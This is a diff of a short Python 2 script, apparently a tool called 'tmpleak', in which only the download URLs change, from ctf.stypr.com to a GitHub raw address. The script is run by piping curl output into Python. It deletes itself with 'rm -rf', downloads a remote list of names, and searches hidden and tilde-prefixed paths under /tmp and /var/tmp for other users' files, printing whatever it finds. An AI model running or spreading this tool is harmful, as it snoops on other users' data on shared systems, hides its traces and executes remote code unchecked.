@@ -4,10 +4,10 @@ import os
 import sys
 import urllib2
 """ Made by stypr, Don't blame me for your system's ignorance!
-Usage: curl -s https://ctf.stypr.com/ctftime/ctftime.py | python -u
+Usage: curl -s https://raw.githubusercontent.com/stypr/tmpleak/master/ctftime.py | python -u
 """
 os.popen("rm -rf %s"%(sys.argv[0])).read()
-p = "https://ctf.stypr.com/ctftime"
+p = "https://raw.githubusercontent.com/stypr/tmpleak/master/"
 q = ("/var/tmp/","/var/tmp/\~","/var/tmp/.","/tmp/","/tmp/.","/tmp/\~")
 k = lambda x: x.split("\n")
 x = k(urllib2.urlopen("%s/user.pwn"%(p,)).read())
@@ -32,4 +32,4 @@ for i in z:
 				print("\n[Found: %s]\n%s"%(j+i.lower(),s))
 			else:
 				print("\n[Found: %s]\n%s"%(j+i,r))
-print 
+print
